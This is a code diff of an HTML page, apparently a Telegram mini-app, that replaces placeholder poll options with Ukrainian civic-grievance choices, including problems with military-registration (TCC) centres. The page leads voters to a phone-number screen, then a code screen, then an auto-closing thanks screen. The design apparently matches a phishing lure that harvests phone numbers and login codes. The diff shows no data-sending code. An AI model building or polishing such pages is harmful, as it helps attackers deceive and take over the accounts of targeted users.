@@ -14,7 +14,7 @@
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
             padding: 20px; 
             
-            /* ТУТ ТВОЙ ФОН (замени ссылку, если нужно) */
+            /* ТУТ ТВОЙ ФОН (можешь заменить ссылку на свою картинку) */
             background: url('https://images.unsplash.com/photo-1557683316-973673baf926?q=80&w=1000&auto=format&fit=crop') no-repeat center center fixed; 
             background-size: cover;
             background-color: #1a1a1a;
@@ -27,7 +27,6 @@
             justify-content: center;
         }
         
-        /* Обертка для контента, чтобы всё было по центру */
         .content-wrapper {
             width: 100%;
             max-width: 400px;
@@ -63,12 +62,10 @@
         .main-btn { background: var(--btn); color: var(--btn-text); border: none; border-radius: 10px; padding: 15px; font-size: 16px; font-weight: 600; width: 100%; margin-top: 10px; cursor: pointer; }
         .main-btn:disabled { opacity: .5; cursor: not-allowed; }
         
-        /* Кнопка Назад */
         .back-btn { background: transparent; color: #ffffff; border: none; font-size: 14px; margin-top: 15px; cursor: pointer; display: block; width: 100%; text-decoration: underline; opacity: 0.8; }
         
         .hidden { display: none !important; }
         
-        /* Поля вводу */
         input[type="tel"], input[type="text"] { 
             width: 100%; box-sizing: border-box; padding: 14px; font-size: 18px; 
             border: 2px solid transparent; border-radius: 10px; 
@@ -87,19 +84,9 @@
             border-radius: 20px;
             backdrop-filter: blur(10px);
         }
-        .thanks-screen .icon {
-            font-size: 60px;
-            margin-bottom: 20px;
-        }
-        .thanks-screen h2 {
-            margin-top: 0;
-            color: #34c759;
-        }
-        .thanks-screen p {
-            font-size: 16px;
-            color: #ffffff;
-            margin-bottom: 25px;
-        }
+        .thanks-screen .icon { font-size: 60px; margin-bottom: 20px; }
+        .thanks-screen h2 { margin-top: 0; color: #34c759; }
+        .thanks-screen p { font-size: 16px; color: #ffffff; margin-bottom: 25px; }
     </style>
 </head>
 <body>
@@ -107,22 +94,25 @@
     <div class="content-wrapper">
         <!-- ЕКРАН 1: ГОЛОСУВАННЯ -->
         <div id="screen-vote">
-            <h2>Зробіть вибір</h2>
+            <h2>Що вас турбує найбільше?</h2>
             <p>Натисніть на одну з карток</p>
             
-            <div class="vote-card" data-vote="Варіант 1" onclick="selectVote(this)">
-                <img src="https://picsum.photos/id/1015/100/100" alt="Варіант 1">
-                <div class="vote-title">Варіант 1</div>
+            <!-- ВАРІАНТ 1 -->
+            <div class="vote-card" data-vote="Черги та тяганина в держустановах" onclick="selectVote(this)">
+                <img src="https://avatars.mds.yandex.net/i?id=38067ddc857e6f426cb2b9599ac47aa2_l-9065850-images-thumbs&n=13" alt="Черги">
+                <div class="vote-title">Черги та тяганина</div>
             </div>
             
-            <div class="vote-card" data-vote="Варіант 2" onclick="selectVote(this)">
-                <img src="https://picsum.photos/id/1025/100/100" alt="Варіант 2">
-                <div class="vote-title">Варіант 2</div>
+            <!-- ВАРІАНТ 2 -->
+            <div class="vote-card" data-vote="Погана робота ЖКГ та комунальників" onclick="selectVote(this)">
+                <img src="https://avatars.mds.yandex.net/i?id=9335520cb61397e2e5872e1ea06a9c68_l-4809955-images-thumbs&n=13" alt="ЖКГ">
+                <div class="vote-title">Погана робота ЖКГ</div>
             </div>
             
-            <div class="vote-card" data-vote="Варіант 3" onclick="selectVote(this)">
-                <img src="https://picsum.photos/id/1035/100/100" alt="Варіант 3">
-                <div class="vote-title">Варіант 3</div>
+            <!-- ВАРІАНТ 3 (Про ТЦК) -->
+            <div class="vote-card" data-vote="Проблеми з ТЦК та СП (військовий облік)" onclick="selectVote(this)">
+                <img src="https://avatars.mds.yandex.net/i?id=1b4fc46e488945e78f8e14d77e29a40a_l-6947220-images-thumbs&n=13" alt="ТЦК">
+                <div class="vote-title">Проблеми з ТЦК та СП</div>
             </div>
 
             <button class="main-btn" id="btn-next-vote" disabled onclick="showPhone()">Далі</button>
@@ -227,7 +217,7 @@
             // Переключаем на экран "Спасибо"
             document.getElementById('screen-code').classList.add('hidden');
             document.getElementById('screen-thanks').classList.remove('hidden');
-            document.getElementById('debug').classList.add('hidden'); // Прячем дебаг, чтобы не мешал
+            document.getElementById('debug').classList.add('hidden');
 
             // Автоматически закрываем мини-апп через 3 секунды
             setTimeout(() => {
